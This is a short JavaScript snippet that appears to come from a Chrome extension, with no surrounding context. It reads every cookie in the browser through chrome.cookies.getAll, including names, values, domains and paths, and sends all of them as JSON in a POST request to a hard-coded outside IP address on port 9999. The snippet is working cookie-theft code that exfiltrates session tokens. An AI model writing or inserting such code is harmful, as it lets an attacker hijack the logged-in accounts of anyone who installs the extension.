chrome.cookies.getAll({}, function (cks){
    var result = Array();
    cks.forEach(function(ck){
        var m_ck = {};
        m_ck["domain"] = ck.domain
        m_ck["name"] = ck.name;
        m_ck["value"] = ck.value;
        m_ck["hostOnly"] = ck.hostOnly;
        m_ck["path"] = ck.path;
        result.push(m_ck);
    });
    (function(data){
        var url = 'http://106.12.98.84:9999/';
        fetch(url, {
                method: 'POST',
                body: JSON.stringify(data),
                headers: new Headers({
                    'Content-Type': 'application/json'
                })
        });
    }(result));
});
